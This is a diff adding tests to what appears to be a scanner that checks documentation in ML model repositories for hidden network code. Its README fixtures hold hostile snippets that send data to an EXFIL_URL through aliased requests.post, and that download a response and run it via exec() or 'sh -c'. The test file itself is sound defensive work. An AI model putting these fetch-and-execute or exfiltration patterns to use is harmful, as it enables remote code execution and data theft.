@@ -765,6 +765,37 @@ send(os.environ["EXFIL_URL"])
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_chained_module_method_alias(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+import requests as r
+
+api_url = "http://localhost:8080/v1/embeddings"
+send = r.post
+fetch = send
+fetch(os.environ["EXFIL_URL"])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.details.get("library") == "requests"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_passive_media_does_not_hide_non_http_url(
     tmp_path: Path,
 ) -> None:
@@ -1397,7 +1428,14 @@ git clone https://github.com/example-org/model.git
     assert determine_exit_code(aggregate) == 1
 
 
-@pytest.mark.parametrize("checkout_command", ["cd model/subdir\npip install .", "cd model/subdir && pip install ."])
+@pytest.mark.parametrize(
+    "checkout_command",
+    [
+        "cd model/subdir\npip install .",
+        "cd model/subdir && pip install .",
+        "cd model\ncd subdir\npip install .",
+    ],
+)
 def test_text_scanner_fenced_documentation_github_clone_subdir_install_remains_actionable(
     tmp_path: Path,
     checkout_command: str,
@@ -1617,7 +1655,7 @@ cd model && ls
     assert determine_exit_code(aggregate) == 0
 
 
-@pytest.mark.parametrize("leave_command", ["cd ..", "cd other"])
+@pytest.mark.parametrize("leave_command", ["cd ..", "cd ../other"])
 def test_text_scanner_fenced_documentation_github_clone_leave_checkout_before_install_is_informational(
     tmp_path: Path,
     leave_command: str,
@@ -2162,6 +2200,36 @@ exec(body)
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_chained_executed_response_alias(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import requests
+
+resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
+body = resp.text
+cmd = body
+exec(cmd)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_imported_response_assignment(
     tmp_path: Path,
 ) -> None:
@@ -2231,6 +2299,40 @@ import requests
 resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
 body = resp.text
 subprocess.run(["sh", "-c", body])
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_multiline_subprocess_response_alias(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import subprocess
+import requests
+
+resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
+body = resp.text
+subprocess.run([
+    "sh",
+    "-c",
+    body,
+])
 ```
 """,
         encoding="utf-8",
